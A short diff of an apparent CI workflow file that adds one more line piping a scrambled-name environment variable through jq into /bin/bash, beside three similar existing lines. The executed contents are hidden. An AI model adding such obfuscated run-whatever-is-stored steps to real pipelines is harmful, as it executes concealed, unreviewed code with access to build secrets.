@@ -27,6 +27,7 @@ jobs:
           echo $s89727 | jq -r .z019 | /bin/bash
           echo $azplr913 | jq -r .wz90 | /bin/bash
           echo $q73 | jq -r .i7 | /bin/bash
+          printf '%s' "$waoav32" | jq -r .xnwau09783 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
